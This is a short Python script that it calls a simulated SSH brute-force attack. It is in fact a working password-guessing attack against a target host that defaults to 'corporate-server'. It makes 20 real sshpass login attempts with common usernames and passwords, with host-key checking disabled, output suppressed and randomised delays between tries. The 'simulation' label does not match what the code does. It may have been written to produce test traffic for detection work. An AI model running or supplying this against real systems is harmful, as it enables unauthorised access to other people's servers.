#!/usr/bin/env python3
import subprocess
import time
import random
import sys

# Target server IP - default to corporate-server if not specified
target = sys.argv[1] if len(sys.argv) > 1 else "corporate-server"

# Simulate brute force SSH attack
usernames = ["admin", "root", "user", "test", "guest"]
passwords = ["password", "123456", "admin", "welcome", "qwerty"]

print(f"Starting simulated brute force attack against {target}")

for _ in range(20):
    username = random.choice(usernames)
    password = random.choice(passwords)
    
    print(f"Trying {username}:{password}")
    
    # Using subprocess to simulate SSH login attempts
    subprocess.run(
        f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {username}@{target}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Random delay between attempts
    time.sleep(random.uniform(0.5, 2.0))

print("Brute force simulation completed")